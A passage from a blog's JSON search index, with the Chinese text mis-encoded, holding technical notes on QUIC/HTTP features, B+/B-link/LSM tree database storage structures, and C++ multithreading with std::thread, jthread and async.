å¸§ä¸­ç»™å‡ºäº†å¤„ç†æ—¶é—´ï¼ŒRTO è®¡ç®—å°†æ‰£é™¤åœ¨æ¥æ”¶æ–¹çš„å¤„ç†æ—¶é—´ å¤´éƒ¨å‹ç¼© QUIC-QPACK é‡‡ç”¨åŠ¨æ€è¡¨ã€é™æ€è¡¨ç­‰ç¼–ç æ–¹å¼ï¼Œå‡å°‘å¤´éƒ¨ä¿¡æ¯ä¼ è¾“çš„æ•°é‡ æœåŠ¡å™¨ä¸»åŠ¨æ¨é€ å½“æœåŠ¡å™¨æ”¶åˆ°èµ„æºè¯·æ±‚å“åº”æ—¶ï¼Œå°†å®¢æˆ·ç«¯å¯èƒ½éœ€è¦çš„èµ„æºä¸»åŠ¨æ¨é€ç»™å®¢æˆ·ç«¯ è®¾ç½® Frame Type ä¸º PUSH_PROMISE","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Web","slug":"Notes/Web","permalink":"https://racleray.github.io/categories/Notes/Web/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://racleray.github.io/tags/HTTP/"},{"name":"Web","slug":"Web","permalink":"https://racleray.github.io/tags/Web/"}],"author":"HeRui"},{"title":"B+ã€B-linkã€LSMæ•°æ®åº“å¸¸ç”¨æ•°æ®ç»“æ„åˆ†æ","slug":"B-ã€B-linkã€LSMæ•°æ®åº“å¸¸ç”¨æ•°æ®ç»“æ„åˆ†æ","date":"2023-09-12T14:54:34.000Z","updated":"2024-01-09T10:20:30.376Z","comments":true,"path":"posts/a20f1877.html","link":"","permalink":"https://racleray.github.io/posts/a20f1877.html","excerpt":"B+ã€B-linkã€LSM æ•°æ®ç»“æ„åˆ†æ","text":"æ•°æ®åº“ç»“æ„ å­˜å‚¨ç»“æ„ å­˜å‚¨æ–‡ä»¶ç±»å‹ï¼šæ•°æ®æ–‡ä»¶ + ç´¢å¼•æ–‡ä»¶ã€‚ æ–‡ä»¶ç»„ç»‡å½¢å¼ ç´¢å¼•ç»„ç»‡è¡¨ å°† æ•°æ®è®°å½• å­˜å‚¨åœ¨ ç´¢å¼•æ–‡ä»¶ å†…éƒ¨ã€‚ä»£è¡¨ï¼šInnoDBã€‚ å †ç»„ç»‡è¡¨/å“ˆå¸Œç»„ç»‡è¡¨ æ•°æ®è®°å½• å­˜å‚¨åœ¨ æ— åºå † ä¸­ã€‚ç´¢å¼•å’Œæ•°æ®åˆ†ç¦»ã€‚ä¸»æµä¸€èˆ¬æ²¡ç”¨å“ˆå¸Œç»„ç»‡è¡¨ã€‚ä»£è¡¨ï¼šOracleã€PostgreSQLã€‚ å…¶å†™å…¥æ€§èƒ½æ¯” ç´¢å¼•ç»„ç»‡è¡¨ é«˜ï¼Œè¯»å–æ€§èƒ½æ¯” ç´¢å¼•ç»„ç»‡è¡¨ ä½ã€‚ä½†æ˜¯æ€»ä½“ä¸Šå¯¹æ€§èƒ½å½±å“è¾ƒå°ã€‚ å…¶ä¸­ç´¢å¼•æ–‡ä»¶ç»„ç»‡å½¢å¼ï¼Œå¯¹æ€§èƒ½å½±å“æ›´å¤§ã€‚ä¸€èˆ¬æ˜¯Bæ ‘æˆ–è€…LSMæ ‘ã€‚å­˜å‚¨ç»“æ„æ‰€æŒ‡çš„ä¹Ÿå°±æ˜¯é’ˆå¯¹ç´¢å¼•æ–‡ä»¶è€Œè¨€ã€‚ å­˜å‚¨ç»“æ„åˆ†ç±» In-place update: ç›´æ¥è¦†ç›–æ—§è®°å½•ã€‚æ–¹ä¾¿è¯»ï¼Œä½†æ˜¯æ›´æ–°ä¼šå¯¼è‡´éšæœºIO (IOäº†å¤šä¸ªæ•°æ®é¡µæ‰æ‰¾åˆ°ç›®æ ‡) åˆ°ç›®æ ‡ä½ç½®ï¼Œæ€§èƒ½é™ä½ã€‚ éšæœºIOï¼Œæ¯”å¦‚ä¸­åºéå† Bæ ‘ æ‰€é€ æˆçš„IO Out-of-place update: å°†æ–°å†…å®¹å­˜åˆ°æ–°ä½ç½®ï¼Œè€Œä¸æ˜¯è¦†ç›–ï¼Œæ‰€ä»¥æŸ¥è¯¢æ—¶éœ€è¦æŸ¥æ‰¾å¤šä¸ªä½ç½®ã€‚ä½†æ˜¯è¿™å¾ˆå¥‘åˆå›ºæ€ç¡¬ç›˜ï¼ˆè¦†ç›–éœ€è¦å…ˆæ“¦é™¤æ—§æ•°æ®ï¼‰å’Œåˆ†å¸ƒå¼æ•°æ®åº“ï¼ˆæœ¬æ¥å°±æ˜¯å¤šä¸ªä½ç½®å­˜å‚¨ã€æŸ¥è¯¢ï¼‰ã€‚åŒæ—¶ï¼Œä¸ºäº†é˜²æ­¢æ•°æ®æ— é™è†¨èƒ€ï¼Œéœ€è¦è¿›è¡Œæ•°æ®æ•´åˆï¼ˆCompactionï¼‰ã€‚ å­˜å‚¨ç»“æ„çš„å…±æ€§ é€‚åˆç£ç›˜å­˜å‚¨ï¼Œç²’åº¦å¤§ï¼Œä¸€æ¬¡è¯»å–ä¸€ç‰‡è¿ç»­åŒºåŸŸï¼ŒIOå°½é‡å°‘ã€‚ å…è®¸å¹¶å‘æ“ä½œï¼Œç²’åº¦å°ï¼Œå¢åˆ æ”¹ å¯¹å­˜å‚¨ç»“æ„çš„å½±å“å°½é‡å°ã€‚ æ»¡è¶³1ä¸æ»¡è¶³2çš„ç»“æ„ï¼šå¤§æ–‡ä»¶ã€æ•°ç»„ï¼Œä¸€æ—¦ä¿®æ”¹ï¼Œå°±è¦é”ä½æ•´ä¸ªæ–‡ä»¶ã€‚ æ»¡è¶³2ä¸æ»¡è¶³1çš„ç»“æ„ï¼šé“¾è¡¨ã€çº¢é»‘æ ‘ã€è·³è¡¨ã€å“ˆå¸Œè¡¨ã€‚å¢åˆ æ”¹ å½±å“è¾ƒå°ï¼Œä½†æ˜¯è¯»å–çš„ç²’åº¦ä¹Ÿå¾ˆå°ã€‚ åŒæ—¶æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼šBæ ‘ã€B+æ ‘ã€LSMæ ‘ç­‰ã€‚ å­˜å‚¨å¼•æ“å¹¶å‘å’Œäº‹åŠ¡å¹¶å‘çš„ä¸åŒ æ¯”å¦‚ä¿®æ”¹ä¸€æ¡æ•°æ®ï¼Œé¦–å…ˆæ˜¯å°†å¯¹åº”é¡µçš„æ•°æ®åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œç„¶ååœ¨è¯¥çº¿ç¨‹ä¸­ä¸ŠLatché”ï¼Œé˜²æ­¢å…¶ä»–çº¿ç¨‹ä¿®æ”¹æ•°æ®ï¼Œå½“æ•°æ®ä¿®æ”¹å®Œæˆåé‡Šæ”¾Latchã€‚ å¯¹äºæ‰€è¦ä¿®æ”¹çš„é‚£ä¸€æ¡æ•°æ®è®°å½•ï¼ŒåŠ ä¸Šäº‹åŠ¡é”Locké˜²æ­¢å…¶ä»–å¹¶å‘äº‹åŠ¡ä¿®æ”¹ï¼Œå½“äº‹åŠ¡æäº¤åé‡Šæ”¾Lockï¼Œæ­¤æ—¶Latchå·²ç»è¢«é‡Šæ”¾äº†ã€‚ æ³¨æ„ï¼Œä¸Šå›¾ä¸­æ˜¯B+æ ‘ï¼Œéå¶å­èŠ‚ç‚¹åªå­˜å‚¨ç´¢å¼•ï¼Œå¶å­ç»“ç‚¹å­˜å‚¨æ•°æ®è®°å½•ã€‚ å­˜å‚¨å¼•æ“é”æœºåˆ¶ MySQL 5.6ä¹‹å‰å¹¶å‘æ§åˆ¶æœºåˆ¶ï¼ŒS Latch è¡¨ç¤ºå†™é”ï¼ŒX Latch è¡¨ç¤ºå†™é”ï¼š MySQL 5.7 8.0 å¹¶å‘æ§åˆ¶æœºåˆ¶ï¼ŒåŠ å…¥äº†å’Œ S Latch å…¼å®¹çš„ SX Latchï¼Œä¸¤è€…å¯ä»¥åŒæ—¶ä¸Šé”ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“å¯¹ç´¢å¼•æ ‘ä¿®æ”¹æ—¶ï¼Œä¹Ÿå¯ä»¥è¿›è¡Œè¯»æ“ä½œï¼Œä¸é˜»å¡ã€‚ å¤šæ ¸å¤„ç†å™¨ä¸­Latchä»£ä»· å¤šä¸ªCPUæ ¸ï¼Œæ¯ä¸ªéƒ½æœ‰ç‹¬ç«‹çš„å­˜å‚¨åŒºåŸŸã€‚è¯»å–å’Œå†™å…¥è¿‡ç¨‹ï¼Œéœ€è¦æŠŠé¡µæ•°æ®åŠ è½½åˆ°è¿™å—åŒºåŸŸä¸­ã€‚å‡å¦‚ä¸€ä¸ªèŠ‚ç‚¹é¡µæ•°æ®ï¼ˆæ¯”å¦‚Bæ ‘çš„æ ¹èŠ‚ç‚¹ï¼‰åŒæ—¶å­˜åœ¨äºå¤šä¸ªæ ¸çš„å­˜å‚¨åŒºåŸŸï¼Œæ­¤æ—¶åŠ Latché”å’Œè§£Latché”çš„æ“ä½œå¿…é¡»åŒæ­¥ç»™å¤šä¸ªæ ¸ï¼Œå°±ä¼šé€ æˆå¾ˆå¤šæ€§èƒ½æŸè€—ã€‚ Bæ ‘ æ¯ä¸ªæ•°æ®åªå­˜å‚¨ä¸€ä»½ ä»¥é¡µä¸ºå•ä½ç»„ç»‡ï¼ŒInnoDBä¸­ä¸€é¡µ16Kï¼Œä¸€é¡µå¯ä»¥å­˜å‚¨å‡ ç™¾ä¸Šåƒä¸ªæŒ‡é’ˆ æ ‘é«˜åº¦ä½ï¼Œè¯»å–æ•°æ®å—è¾ƒå¤§ å¢åˆ æ”¹ å¯èƒ½é€ æˆèŠ‚ç‚¹çš„åˆ†è£‚å’Œåˆå¹¶ï¼ˆSMOï¼ŒStructure Modification Operationï¼‰ï¼Œéœ€è¦å¯¹å¯èƒ½å‘ç”Ÿåˆ†è£‚æˆ–è€…åˆå¹¶çš„èŠ‚ç‚¹æ•°æ®è¿›è¡ŒåŠ é”ï¼Œå¯¼è‡´å¹¶å‘æ“ä½œæ€§èƒ½ä¸ç†æƒ³ã€‚ Bæ ‘ä¼˜åŒ–å˜ç§ B+æ ‘ï¼šä¼˜åŒ–IOï¼Œéå¶å­èŠ‚ç‚¹åªå­˜å‚¨ç´¢å¼•æŒ‡é’ˆï¼Œå¶å­ç»“ç‚¹å­˜å‚¨æ•°æ®è®°å½•ï¼Œå„å¶å­èŠ‚ç‚¹è¿æ¥æˆåŒå‘å¾ªç¯é“¾è¡¨ã€‚åŒºåˆ†å‡ºç´¢å¼•æ®µå’Œæ•°æ®æ®µï¼Œæ‰«æå…¨è¡¨æ—¶é¡ºåºIOå¾—åˆ°ä¼˜åŒ–ã€‚ è¿™é‡Œä¼˜åŒ–IOï¼Œæ˜¯å› ä¸ºå¶å­ç»“ç‚¹ä¸ä¼šå­˜å‚¨æ•°æ®ï¼Œè€Œåªæ˜¯ä½œä¸ºæœç´¢ç´¢å¼•ï¼Œéå†ç´¢å¼•ä¸ä¼šå¯¹æ•°æ®è®°å½•è¿›è¡ŒIOï¼Œè¿™é™ä½äº†ç´¢å¼•IOçš„è´Ÿæ‹…ï¼Œä¸€æ¬¡è¯»å–æ›´å¤šçš„ç´¢å¼•ï¼ŒIOæ€§èƒ½è‡ªç„¶æ›´å¥½ã€‚ B* æ ‘ï¼šä¼˜åŒ–ç©ºé—´åˆ©ç”¨ç‡ï¼Œåˆ†è£‚èŠ‚ç‚¹æ—¶ï¼Œå½“ç›¸é‚»ä¸¤ä¸ªç©ºé—´éƒ½æ»¡æ—¶ï¼Œåˆ†è£‚å‡ºä¸‰ä¸ªèŠ‚ç‚¹ã€‚ B-Linkï¼šä¼˜åŒ–å¹¶å‘æ“ä½œï¼Œå¯¹æ ‘çš„èŠ‚ç‚¹ä¸Šé”æ—¶ï¼Œå¯ä»¥ä¸å¯¹æ•´ä¸ªæ ‘ä¸Šé”ï¼Œè€Œæ˜¯ä»ä¸‹åˆ°ä¸Šï¼Œåªé”åˆ°éœ€è¦ä¿®æ”¹çš„èŠ‚ç‚¹ã€‚ Bw: é‡‡ç”¨ç±»ä¼¼LSMæ ‘çš„out-of-place updateæ–¹æ³•ï¼Œè¿½åŠ å†™å…¥æ–¹å¼ï¼Œå®Œå…¨æ²¡æœ‰Latchã€‚ LSMæ ‘ SSDè¯»æ€§èƒ½æå‡ï¼Œå¼¥è¡¥äº†LSMè¯»å–æ€§èƒ½ä½çš„åŠ£åŠ¿ã€‚åŒæ—¶LSMæ ‘å†™æ•°æ®çš„æ–¹å¼ï¼Œå¯¹SSDçš„å‹å¥½ï¼Œä¸ä¼šé¢‘ç¹æ“¦é™¤æ•°æ®ï¼Œå¢åŠ è®¾å¤‡ä½¿ç”¨å¯¿å‘½ã€‚ LSMæ ‘æ˜¯å¤šå±‚ç»“æ„ï¼Œä¸‹å±‚æ•°æ®è¶Šæ¥è¶Šå¤šã€‚å†™å…¥æ“ä½œéƒ½æ˜¯å†™å…¥å†…å­˜ï¼Œå†™æ»¡è§„å®šå®¹é‡åï¼Œå°±ä¼šå°†å†…å­˜æ•°æ®è¿½åŠ æ’å…¥ç£ç›˜ã€‚é€šè¿‡å¯¹ä¸åŒå±‚é—´æ•°æ®æ’åºå»é‡ï¼Œå‹ç¼©å ç”¨ç©ºé—´ã€‚ è¯»å–æ•°æ®ï¼Œä»¥æœ€æ–°çš„ä¸ºå‡†ã€‚ LSMæ ‘å­˜å‚¨å¼•æ“ç»“ï¼ˆRocksDB)æ„å›¾ã€‚ å†™å…¥æ•°æ®å…ˆå†™ write ahead log å†…å­˜ä¸­æ•°æ®ç»“æ„ä½¿ç”¨ Skip List æ•°æ®è½ç›˜åˆ° L0 å±‚ä¸è¿›è¡Œåˆå¹¶ï¼Œæ‰€ä»¥ä¼šæœ‰é‡å¤æ•°æ® æ•°æ®è¾¾åˆ°éœ€è¦å†™å…¥ä¸‹å±‚çš„é‡æ—¶ï¼Œåˆ›å»º SST(Sorted String Table) ç±»ä¼¼ä¸€ä¸ªå°å‹çš„å­æ•°æ®åº“ç»“æ„ æ¯å±‚ä¹‹é—´ï¼Œå‘ä¸‹è½ç›˜æ—¶ï¼Œåªåˆå¹¶é‡å çš„éƒ¨åˆ†ï¼Œæ¯å±‚æ•°æ®ä¸é‡å  æŸ¥æ‰¾æ—¶ï¼Œä½¿ç”¨ Bloom Filter (å°†keyå€¼é€šè¿‡å¤šä¸ªhashå‡½æ•°ï¼Œæ˜ å°„åˆ°bit arrayä¸­ä¸åŒçš„indexä½ç½®ï¼ŒæŸ¥çœ‹æ˜¯å¦éƒ½æ˜¯1ï¼Œè¡¨ç¤ºæŸ¥æ‰¾å‘½ä¸­)ï¼Œä¸ä¼šè¿”å›å‡é˜´æ€§ï¼ˆfalse positiveï¼‰ç»“æœï¼Œå°±æ˜¯æŸ¥æ‰¾ç»“æœæ—¶ä¸åœ¨çš„ï¼Œå°±ä¸€å®šä¸åœ¨ åˆå¹¶ç­–ç•¥å¯ä»¥æ˜¯åˆå¹¶åæ›¿æ¢ä¸‹å±‚æ•°æ®ï¼Œä¹Ÿå¯ä»¥æ˜¯å°†ä¸Šå±‚åˆå¹¶çš„ç»“æœæ”¾å…¥ä¸‹ä¸€å±‚ï¼Œè€Œä¸è¿›è¡Œå†™æ›¿æ¢ ä¸å®é™…æ›¿æ¢çš„å†™æ•ˆç‡æ˜¾ç„¶æ˜¯æ›´é«˜çš„ã€‚è¿™ç‚¹åœ¨è®¾è®¡é¢‘ç¹å†™å…¥çš„æ•°æ®ç»“æ„æ—¶ï¼Œæ˜¯å¯ä»¥å€Ÿé‰´è¿™ç§å»¶è¿Ÿæ›¿æ¢çš„å®ç°æ–¹å¼çš„ã€‚ å¯¹ Compaction æ“ä½œï¼Œæœ‰ä¸€äº›ä¼˜åŒ–æ–¹æ¡ˆï¼š è¯»ã€åˆå¹¶ã€å†™å…¥æ“ä½œæµæ°´çº¿åŒ– Compaction ä¹‹åï¼Œä¸»åŠ¨æ›´æ–° Cache é‡‡ç”¨å•ç‹¬è®¾è®¡çš„FPGAç¡¬ä»¶ï¼Œè´Ÿè´£ Compaction æ“ä½œï¼Œå‡å°‘CPUè´Ÿæ‹…ã€‚ è¿½åŠ å†™å…¥ï¼Œæ²¡æœ‰SMOè¿‡ç¨‹ã€‚æ²¡æœ‰Bæ ‘å­˜åœ¨çš„Latchå¯¼è‡´çš„é—®é¢˜ã€‚ ä½†æ˜¯ï¼ŒLSMè¯»å–æ•°æ®æ—¶ï¼Œå¯èƒ½ä¼šå¤šå±‚å¤šæ¬¡è¯»å–ï¼Œæ¯å±‚æ•°æ®è¾ƒå¤šï¼Œç¼“å­˜Missæƒ…å†µå¯èƒ½ä¼šå¤šä¸€äº›ï¼Œè¯»æ€§èƒ½æ”¶åˆ°å½±å“ã€‚ å¦å¤–ï¼Œè™½ç„¶å†™å…¥è¿‡ç¨‹æ²¡æœ‰SMOï¼Œä½†æ˜¯Compactionè¿‡ç¨‹æ˜¯å­˜åœ¨SMOé—®é¢˜çš„ï¼Œè¿˜å­˜åœ¨ç¼“å†²ä¸¢å¤±ã€write stallï¼ˆå†™åœé¡¿ï¼‰ç­‰é—®é¢˜ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DataBase","slug":"Notes/DataBase","permalink":"https://racleray.github.io/categories/Notes/DataBase/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"https://racleray.github.io/tags/Data-Structure/"},{"name":"DataBase","slug":"DataBase","permalink":"https://racleray.github.io/tags/DataBase/"}],"author":"HeRui"},{"title":"C++å¤šçº¿ç¨‹ç¬”è®°","slug":"C-å¤šçº¿ç¨‹ç¬”è®°","date":"2023-09-12T14:53:11.000Z","updated":"2024-01-09T10:17:59.359Z","comments":true,"path":"posts/24f0dc1c.html","link":"","permalink":"https://racleray.github.io/posts/24f0dc1c.html","excerpt":"ç°ä»£ C++ å¤šçº¿ç¨‹ç¬”è®°","text":"C++ chrono æ˜ç¡®åŒºåˆ†æ—¶é—´ç‚¹ä¸æ—¶é—´æ®µã€‚ æ—¶é—´ç‚¹ç±»å‹ï¼šchrono::steady_clock::time_point ç­‰ æ—¶é—´æ®µç±»å‹ï¼šchrono::millisecondsï¼Œchrono::secondsï¼Œchrono::minutes ... åˆ©ç”¨è¿ç®—ç¬¦é‡è½½ï¼šæ—¶é—´ç‚¹+æ—¶é—´æ®µ=æ—¶é—´ç‚¹ï¼Œæ—¶é—´ç‚¹-æ—¶é—´ç‚¹=æ—¶é—´æ®µã€‚ 1234auto t0 = chrono::steady_clock::now(); // è·å–å½“å‰æ—¶é—´ç‚¹auto t1 = t0 + chrono::seconds(30); // å½“å‰æ—¶é—´ç‚¹çš„30ç§’åauto dt = t1 - t0; // è·å–ä¸¤ä¸ªæ—¶é—´ç‚¹çš„å·®ï¼ˆæ—¶é—´æ®µï¼‰int64_t sec = chrono::duration_cast&lt;chrono::seconds&gt;(dt).count(); // æ—¶é—´å·®çš„ç§’æ•° è·¨å¹³å°çš„ sleepï¼šstd::this_thread::sleep_for å¯ä»¥ç”¨ std::this_thread::sleep_for æ›¿ä»£ Unix ç±»æ“ä½œç³»ç»Ÿä¸“æœ‰çš„çš„ usleepã€‚ä»–å¯ä»¥è®©å½“å‰çº¿ç¨‹ä¼‘çœ ä¸€æ®µæ—¶é—´ã€‚ 12345678#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;chrono&gt;int main() &#123; std::this_thread::sleep_for(std::chrono::milliseconds(400)); return 0;&#125; é™¤äº†æ¥å—ä¸€ä¸ªæ—¶é—´æ®µçš„ sleep_forï¼Œè¿˜æœ‰æ¥å—ä¸€ä¸ªæ—¶é—´ç‚¹çš„ sleep_untilï¼Œè¡¨ç¤ºè®©å½“å‰çº¿ç¨‹ä¼‘çœ ç›´åˆ°æŸä¸ªæ—¶é—´ç‚¹ã€‚ 123456789#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;chrono&gt;int main() &#123; auto t = std::chrono::steady_clock::now() + std::chrono::milliseconds(400); std::this_thread::sleep_until(t); return 0;&#125; è¿›ç¨‹ä¸çº¿ç¨‹ è¿›ç¨‹æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºè¢«æ“ä½œç³»ç»Ÿæ‹‰èµ·æ¥åŠ è½½åˆ°å†…å­˜ä¹‹åä»å¼€å§‹æ‰§è¡Œåˆ°æ‰§è¡Œç»“æŸçš„è¿™æ ·ä¸€ä¸ªè¿‡ç¨‹ã€‚ç®€å•æ¥è¯´ï¼Œè¿›ç¨‹æ˜¯ç¨‹åºï¼ˆåº”ç”¨ç¨‹åºï¼Œå¯æ‰§è¡Œæ–‡ä»¶ï¼‰çš„ä¸€æ¬¡æ‰§è¡Œã€‚æ¯”å¦‚åŒå‡»æ‰“å¼€ä¸€ä¸ªæ¡Œé¢åº”ç”¨è½¯ä»¶å°±æ˜¯å¼€å¯äº†ä¸€ä¸ªè¿›ç¨‹ã€‚ çº¿ç¨‹æ˜¯è¿›ç¨‹ä¸­çš„ä¸€ä¸ªå®ä½“ï¼Œæ˜¯è¢«ç³»ç»Ÿç‹¬ç«‹åˆ†é…å’Œè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚çº¿ç¨‹æ˜¯CPUå¯æ‰§è¡Œè°ƒåº¦çš„æœ€å°å•ä½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿›ç¨‹æœ¬èº«å¹¶ä¸èƒ½è·å–CPUæ—¶é—´ï¼Œåªæœ‰å®ƒçš„çº¿ç¨‹æ‰å¯ä»¥ã€‚ æ¯ä¸ªçº¿ç¨‹å…±äº«åŒæ ·çš„å†…å­˜ç©ºé—´ï¼Œå¼€é”€æ¯”è¾ƒå°ã€‚ æ¯ä¸ªè¿›ç¨‹æ‹¥æœ‰ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼Œå› æ­¤å¼€é”€æ›´å¤§ã€‚ å¯¹äºé«˜æ€§èƒ½å¹¶è¡Œè®¡ç®—ï¼Œæ›´å¥½çš„æ˜¯å¤šçº¿ç¨‹ã€‚ C++ ä¸­çš„å¤šçº¿ç¨‹ï¼šstd::thread C++11 å¼€å§‹ï¼Œä¸ºå¤šçº¿ç¨‹æä¾›äº†è¯­è¨€çº§åˆ«çš„æ”¯æŒã€‚ä»–ç”¨ std::thread è¿™ä¸ªç±»æ¥è¡¨ç¤ºçº¿ç¨‹ã€‚ std::thread æ„é€ å‡½æ•°çš„å‚æ•°å¯ä»¥æ˜¯ä»»æ„ lambda è¡¨è¾¾å¼ã€‚ 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;string&gt;void download(std::string file) &#123; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; \"Downloading \" &lt;&lt; file &lt;&lt; \" (\" &lt;&lt; i * 10 &lt;&lt; \"%)...\" &lt;&lt; std::endl; std::this_thread::sleep_for(std::chrono::milliseconds(400)); &#125; std::cout &lt;&lt; \"Download complete: \" &lt;&lt; file &lt;&lt; std::endl;&#125;void interact() &#123; std::string name; std::cin &gt;&gt; name; std::cout &lt;&lt; \"Hi, \" &lt;&lt; name &lt;&lt; std::endl;&#125;int main() &#123; std::thread t1([&amp;] &#123; download(\"hello.zip\"); &#125;); interact(); std::cout &lt;&lt; \"Waiting for child thread...\" &lt;&lt; std::endl; t1.join(); std::cout &lt;&lt; \"Child thread exited!\" &lt;&lt; std::endl; return 0;&#125; å¦‚æœä½¿ç”¨CMakeï¼Œç¼–è¯‘æ—¶é“¾æ¥è®¾ç½®ï¼š 12find_package(Threads REQUIRED)target_link_libraries(cpptest PUBLIC Threads::Threads) ä½œä¸ºä¸€ä¸ª C++ ç±»ï¼Œstd::thread åŒæ ·éµå¾ª RAII æ€æƒ³å’Œä¸‰äº”æ³•åˆ™ï¼šå› ä¸ºç®¡ç†ç€èµ„æºï¼Œä»–è‡ªå®šä¹‰äº†è§£æ„å‡½æ•°ï¼Œåˆ é™¤äº†æ‹·è´æ„é€ /èµ‹å€¼å‡½æ•°ï¼Œä½†æ˜¯æä¾›äº†ç§»åŠ¨æ„é€ /èµ‹å€¼å‡½æ•°ã€‚ å½“ t1 æ‰€åœ¨çš„å‡½æ•°é€€å‡ºæ—¶ï¼Œå°±ä¼šè°ƒç”¨ std::thread çš„è§£æ„å‡½æ•°ï¼Œè¿™ä¼šé”€æ¯ t1 çº¿ç¨‹ã€‚ t1.detach() æ„å‘³ç€çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸä¸å†ç”±å½“å‰ std::thread å¯¹è±¡ç®¡ç†ï¼Œè€Œæ˜¯åœ¨çº¿ç¨‹é€€å‡ºä»¥åè‡ªåŠ¨é”€æ¯è‡ªå·±ã€‚ 12345678910111213void myfunc() &#123; std::thread t1([&amp;] &#123; download(\"hello.zip\"); &#125;); t1.detach(); // t1 æ‰€ä»£è¡¨çš„çº¿ç¨‹è¢«åˆ†ç¦»äº†ï¼Œä¸å†éš t1 å¯¹è±¡é”€æ¯&#125;int main() &#123; myfunc(); interact(); return 0;&#125; ä½†æ˜¯ detach çš„é—®é¢˜æ˜¯è¿›ç¨‹é€€å‡ºæ—¶å€™ä¸ä¼šç­‰å¾…æ‰€æœ‰å­çº¿ç¨‹æ‰§è¡Œå®Œæ¯•ã€‚æ‰€ä»¥å¦ä¸€ç§è§£æ³•æ˜¯æŠŠ t1 å¯¹è±¡ç§»åŠ¨åˆ°ä¸€ä¸ªå…¨å±€å˜é‡å»ï¼Œä»è€Œå»¶é•¿å…¶ç”Ÿå‘½å‘¨æœŸåˆ° myfunc å‡½æ•°ä½“å¤–ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;string&gt;#include &lt;vector&gt;void download(std::string file) &#123; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; \"Downloading \" &lt;&lt; file &lt;&lt; \" (\" &lt;&lt; i * 10 &lt;&lt; \"%)...\" &lt;&lt; std::endl; std::this_thread::sleep_for(std::chrono::milliseconds(400)); &#125; std::cout &lt;&lt; \"Download complete: \" &lt;&lt; file &lt;&lt; std::endl;&#125;void interact() &#123; std::string name; std::cin &gt;&gt; name; std::cout &lt;&lt; \"Hi, \" &lt;&lt; name &lt;&lt; std::endl;&#125;class ThreadPool &#123; std::vector&lt;std::thread&gt; m_pool;public: void push_back(std::thread thr) &#123; m_pool.push_back(std::move(thr)); &#125; ~ThreadPool() &#123; // main å‡½æ•°é€€å‡ºåä¼šè‡ªåŠ¨è°ƒç”¨ for (auto &amp;t: m_pool) t.join(); // ç­‰å¾…æ± é‡Œçš„çº¿ç¨‹å…¨éƒ¨æ‰§è¡Œå®Œæ¯• &#125;&#125;;ThreadPool tpool;void myfunc() &#123; std::thread t1([&amp;] &#123; download(\"hello.zip\"); &#125;); // ç§»äº¤æ§åˆ¶æƒåˆ°å…¨å±€çš„ pool åˆ—è¡¨ï¼Œä»¥å»¶é•¿ t1 çš„ç”Ÿå‘½å‘¨æœŸ tpool.push_back(std::move(t1));&#125;int main() &#123; myfunc(); interact(); return 0;&#125; C++20 std::jthread ç±» C++20 å¼•å…¥äº† std::jthread ç±»ï¼Œå’Œ std::thread ä¸åŒåœ¨äºï¼šä»–çš„è§£æ„å‡½æ•°é‡Œä¼šè‡ªåŠ¨è°ƒç”¨ join() å‡½æ•°ï¼Œä»è€Œä¿è¯ pool è§£æ„æ—¶ä¼šè‡ªåŠ¨ç­‰å¾…å…¨éƒ¨çº¿ç¨‹æ‰§è¡Œå®Œæ¯•ã€‚ 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;string&gt;#include &lt;vector&gt;void download(std::string file) &#123; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; \"Downloading \" &lt;&lt; file &lt;&lt; \" (\" &lt;&lt; i * 10 &lt;&lt; \"%)...\" &lt;&lt; std::endl; std::this_thread::sleep_for(std::chrono::milliseconds(400)); &#125; std::cout &lt;&lt; \"Download complete: \" &lt;&lt; file &lt;&lt; std::endl;&#125;void interact() &#123; std::string name; std::cin &gt;&gt; name; std::cout &lt;&lt; \"Hi, \" &lt;&lt; name &lt;&lt; std::endl;&#125;// ~jthread() è§£æ„å‡½æ•°é‡Œä¼šè‡ªåŠ¨è°ƒç”¨ join()ï¼Œå¦‚æœ joinable() çš„è¯std::vector&lt;std::jthread&gt; pool;void myfunc() &#123; std::jthread t1([&amp;] &#123; download(\"hello.zip\"); &#125;); // ç§»äº¤æ§åˆ¶æƒåˆ°å…¨å±€çš„ pool åˆ—è¡¨ï¼Œä»¥å»¶é•¿ t1 çš„ç”Ÿå‘½å‘¨æœŸ pool.push_back(std::move(t1));&#125;int main() &#123; myfunc(); interact(); return 0;&#125; å¼‚æ­¥ std::async std::async æ¥å—ä¸€ä¸ªå¸¦è¿”å›å€¼çš„ lambdaï¼Œè‡ªèº«è¿”å›ä¸€ä¸ª std::future å¯¹è±¡ã€‚lambda çš„å‡½æ•°ä½“å°†åœ¨å¦ä¸€ä¸ªçº¿ç¨‹é‡Œæ‰§è¡Œã€‚åœ¨ main é‡Œé¢åšä¸€äº›åˆ«çš„äº‹æƒ…ï¼Œæœ€åè°ƒç”¨ future çš„ get() æ–¹æ³•ï¼Œå¦‚æœæ­¤æ—¶ download è¿˜æ²¡å®Œæˆï¼Œä¼šç­‰å¾… download å®Œæˆï¼Œå¹¶è·å– download çš„è¿”å›å€¼ã€‚ é™¤äº† get() ä¼šç­‰å¾…çº¿ç¨‹æ‰§è¡Œå®Œæ¯•å¤–ï¼Œwait() 